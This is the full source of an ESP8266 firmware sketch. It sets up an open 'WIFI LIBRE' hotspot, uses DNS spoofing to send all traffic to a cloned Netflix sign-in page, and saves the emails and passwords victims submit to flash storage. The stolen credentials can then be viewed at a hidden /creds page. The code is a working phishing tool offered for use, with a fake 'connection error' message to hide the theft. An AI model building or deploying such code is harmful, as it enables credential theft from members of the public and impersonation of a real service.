// ESP8266 WiFi Portal Cautivo Falso Netflix Login
// By 125K (github.com/125K)
// Remixeado por RaulmejIA (github.com/RaulmejIA)
// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

// User configuration
#define SSID_NAME "WIFI LIBRE"
#define POST_TITLE "Error de conexion"
#define POST_BODY_1 "Internet parece estar fuera de linea......"
#define POST_BODY_2 "Intentelo mas adelante"
#define PASS_TITLE "Credenciales"
#define CLEAR_TITLE "Limpiar"

//function prototypes
void readData();
void writeData(String data);
void deleteData();

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String index() {
    String CSS = String("body { background-color: #141414; color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }")
                 + String(".login-container { background-color: rgba(0, 0, 0, 0.8); padding: 40px; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); width: 300px; text-align: center; }")
                 + String("h1 { font-size: 24px; margin-bottom: 20px; }")
                 + String("input[type='text'], input[type='password'] { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 4px; background-color: #333; color: white; font-size: 16px; }")
                 + String("input[type='text']:focus, input[type='password']:focus { outline: none; background-color: #555; }")
                 + String("button { width: 100%; padding: 10px; margin-top: 10px; border: none; border-radius: 4px; background-color: #e50914; color: white; font-size: 16px; cursor: pointer; }")
                 + String("button:hover { background-color: #f40612; }")
                 + String("p { margin-top: 20px; font-size: 14px; }")
                 + String("a { color: #e50914; text-decoration: none; }")
                 + String("a:hover { text-decoration: underline; }")
                 + String("#logo { width: 100%; max-width: 200px; margin-bottom: 20px; }"); // Estilo para el logo

    String h = "<style>" + CSS + "</style>"
             + "<!DOCTYPE html><html lang=\"en\" dir=\"ltr\"><head><meta charset=\"utf-8\"><title>Netflix Sign In</title><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\" /></head><body>"
             + "<div id='login-app'>"
             + "<div class=\"login-container\">"
             + "<svg id='logo' xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 600 100\" width=\"200\" height=\"50\">"
             + "<text x=\"0\" y=\"100\" font-family=\"Helvetica, Arial, sans-serif\" font-size=\"100\" fill=\"#E50914\">Netflix</text>" // Texto "Netflix"
             + "</svg>"
             + "<h1>Sign In</h1>"
             + "<form method=\"POST\" action=\"/post\" id='email-form-step'>"
             + "<input name=\"email\" id='email-input' type=\"text\" placeholder=\"Email or phone number\" required>"
             + "<input name=\"password\" id='password-input' type=\"password\" placeholder=\"Password\" required>"
             + "<button type=\"submit\">Sign In</button>"
             + "<p>New to Netflix? <a href=\"#\">Sign up now.</a></p>"
             + "</form>"
             + "</div>"
             + "</div>"
             + "</body></html>";
    return h; // Devuelve el HTML completo
}


String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }";
  String h = "<!DOCTYPE html><html>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><div><h1>"+t+"</h1></div><div>";
  return h; }


String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>";
}

String posted() {
  String email=input("email");
  String password=input("password");
  readData();  //retrieves saved data and adds the new data. The data variable is updated and saved again to LittleFS
  Credentials = data + "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header(POST_TITLE) + POST_BODY_1 + POST_BODY_2;
}

String clear() {
  String email="<p></p>";
  String password="<p></p>";
  Credentials="<p></p>";
  data = "";
  savedData = 0;
  deleteData();  //deletes the file from LittleFS
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>";
}

void BLINK() {  // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

void readData()  //reads the file from LittleFS and returns as the string variable called: data
{
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "r");
  //Check if the file exists
  if (!file) {
    return;
  }
  data = "";  //setup for data read
  int i = 0;
  char myArray[1000];
  while (file.available()) {

    myArray[i] = (file.read());  //file is read one character at a time into the char array
    i++;
  }
  myArray[i] = '\0';  //a null is added at the end
  //Close the file
  file.close();
  data = String(myArray);  //convert the array into a string ready for return
  if (data != ""){
    savedData=1;
  }
}

void writeData(String data) {
  //Open the file
  File file = LittleFS.open("/SavedFile.txt", "w");
  //Write to the file
  file.print(data);
  delay(1);
  //Close the file
  file.close();
}

void deleteData() {
  //Remove the file
  LittleFS.remove("/SavedFile.txt");
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  //LittleFS set up
  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    delay(1000);
    return;
  }
  //Read the saved data every boot
  readData();

}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}
